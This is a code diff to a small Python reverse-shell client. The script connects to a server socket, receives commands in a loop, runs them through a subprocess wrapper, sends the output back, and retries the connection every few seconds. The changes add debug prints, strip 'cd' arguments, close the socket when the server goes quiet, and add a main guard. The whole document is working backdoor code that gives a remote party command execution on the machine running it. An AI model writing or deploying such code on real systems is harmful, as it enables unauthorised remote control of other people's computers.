@@ -30,17 +30,21 @@ class MyProcess(subprocess.Popen):
             return output_res
         return output_res
 
+def handel(signum,frame):
+    raise socket.error
+
 def connection(HOST,PORT):
     HEADERSIZE = 10
     cl = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     cl.connect((HOST,PORT))
-
     # Todo live file streaming and editing
     while True:
         cmd = cl.recv(4096)
+        print('after recv')
+        print(cmd.decode('utf-8'))
         try:
             if cmd[:2].decode("utf-8") == 'cd':
-                os.chdir(cmd[3:].decode("utf-8"))
+                os.chdir(cmd[3:].decode("utf-8").strip())
         except OSError:
             pass
 
@@ -59,12 +63,13 @@ def connection(HOST,PORT):
             cl.send(str.encode(output,'utf-8'))
         else:
 
-            continue
+            cl.close()           # if no msg received i.e server not responding it will close the socket
+            return
 
-
-while True:
-    try:
-        connection(socket.gethostname(),1234)
-    except socket.error:
-
-        time.sleep(2)
+if __name__=="__main__":
+    while True:
+        try:
+            connection(socket.gethostname(),1234)
+        except socket.error:
+            print('server not there')
+            time.sleep(5)
